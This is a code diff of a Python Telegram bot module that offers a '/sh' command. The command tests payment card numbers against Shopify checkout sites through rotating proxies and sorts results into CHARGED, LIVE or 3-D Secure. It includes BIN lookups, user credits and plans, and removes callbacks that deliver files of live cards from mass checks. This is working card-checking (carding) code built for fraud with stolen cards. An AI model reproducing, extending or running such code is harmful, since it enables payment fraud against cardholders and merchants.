         rem    = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
         if rem > 0:
             await update.message.reply_text(
-                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>", parse_mode="HTML"); return
-        cd_map[user.id]  = time.time()
-        ud["credits"]    = max(0, ud.get("credits", 1) - 1)
+                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>",
+                parse_mode="HTML"); return
+        cd_map[user.id] = time.time()
+        ud["credits"]   = max(0, ud.get("credits", 1) - 1)
 
     plan = ud.get("plan", "TRIAL")
 
+    # Show spinner with new UI style
     spin = await update.message.reply_text(
         f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
         f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking...</b>',
@@ -1036,22 +978,15 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     proxies = _load_proxies()
 
     if not proxies:
-        try:
-            await spin.edit_text(
-                "❌ <b>No proxies found in px.txt</b>\n\n"
-                "The Shopify API requires proxies to work.\n"
-                "Add your proxies to <code>px.txt</code> (one per line).",
-                parse_mode="HTML",
-            )
-        except Exception:
-            pass
-        return
+        await spin.edit_text(
+            "❌ <b>No proxies in px.txt</b>\n\n"
+            "The API requires proxies. Add them to <code>px.txt</code>.",
+            parse_mode="HTML"); return
 
     t0 = time.time()
     try:
-        sess = await _sh_session()
         (verdict, resp, price, currency), bin_data = await asyncio.gather(
-            _check_card_with_retry(sess, card, sites, proxies,
+            _check_card_with_retry(None, card, sites, proxies,
                                    max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT),
             _bin_lookup(cc[:6]),
         )
@@ -1063,11 +998,11 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text    = build_result_msg(card, resp, verdict, bin_data,
                                price, currency, elapsed, user, plan)
 
+    # Button
     if verdict in ("CHARGED", "LIVE", "TDS"):
         kb = RawMarkup([[_btn(
             "💎 CHARGED" if verdict == "CHARGED" else "✅ LIVE",
             url=BOT_CHANNEL, style="primary",
-            icon=BTN_CHARGED_EMOJI_ID if verdict == "CHARGED" else BTN_LIVE_EMOJI_ID,
         )]])
     else:
         kb = RawMarkup([[_btn("📢 Channel", url=BOT_CHANNEL)]])
@@ -1079,83 +1014,13 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(text, parse_mode="HTML",
                                         disable_web_page_preview=True, reply_markup=kb)
 
+    # DM for CHARGED / LIVE
     if verdict in ("CHARGED", "LIVE", "TDS"):
-        asyncio.create_task(_send_hit(
-            context.bot, update.message.chat_id, user,
-            update.message.message_id, text, verdict,
-        ))
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# CALLBACKS
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    parts = q.data.split(":", 2)
-    if len(parts) < 3:
-        await q.answer("❌ Invalid.", show_alert=True); return
-    _, sid, kind = parts
-    sess = MSH_SESSIONS.get(sid)
-    if not sess:
-        await q.answer("⚠️ Session expired.", show_alert=True); return
-    if q.from_user.id != sess.get("user_id"):
-        await q.answer("❌ Not your session.", show_alert=True); return
-    if time.time() - sess["start_time"] < BUTTON_LOCK:
-        await q.answer(f"⏳ Wait {int(BUTTON_LOCK-(time.time()-sess['start_time']))+1}s",
-                       show_alert=True); return
-    buf, fname, count = _make_result_file(sess, kind)
-    if count == 0:
-        await q.answer(f"❌ No {kind} cards yet.", show_alert=True); return
-    await q.answer("📦 Sending…")
-    try:
-        await context.bot.send_document(
-            chat_id=q.message.chat_id,
-            document=InputFile(buf, filename=fname),
-            caption=(f"<b>Gate ➳ Shopify | 0-20$</b>\n"
-                     f"<b>Type ➳ {kind.capitalize()}</b>\n"
-                     f"<b>Total ➳ {count}</b>"),
-            parse_mode="HTML",
-            reply_to_message_id=sess.get("user_msg_id"),
-        )
-    except Exception as e:
-        logging.error(f"[MSH] send_document: {e}")
-
-
-async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    parts = q.data.split(":", 1)
-    if len(parts) < 2:
-        await q.answer("❌ Invalid.", show_alert=True); return
-    _, sid = parts
-    sess = MSH_SESSIONS.get(sid)
-    if not sess:
-        await q.answer("⚠️ Already finished.", show_alert=True); return
-    if q.from_user.id != sess.get("user_id"):
-        await q.answer("❌ Not your session.", show_alert=True); return
-    if sess["status"] != "CHECKING":
-        await q.answer("ℹ️ Not running.", show_alert=True); return
-    sess["status"] = "STOPPED"
-    for t in sess.get("tasks", []):
-        if not t.done(): t.cancel()
-    conn = sess.get("_connector")
-    if conn and not conn.closed:
-        try: await conn.close()
-        except Exception: pass
-    await q.answer("🛑 Stopped.")
-    sess["last_text"] = ""
-    await _update_progress(context.bot, sid, force=True)
+        asyncio.create_task(_send_hit(context.bot, user, text, verdict))
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # HANDLER EXPORT
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def get_sh_handler() -> CommandHandler:
-    """
-    Returns a SINGLE CommandHandler("sh", cmd_sh).
-    main.py: app.add_handler(get_sh_handler())
-
-    The /msh command is registered by main.py's own cmd_msh which calls:
-      _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT,
-      run_mass_batch, create_msh_session, MSH_SESSIONS,
-      build_result_msg, cb_msh_result, cb_msh_stop
-    all imported from this module.
-    """
+    """Returns CommandHandler('sh', cmd_sh). main.py: app.add_handler(get_sh_handler())"""
     return CommandHandler("sh", cmd_sh)
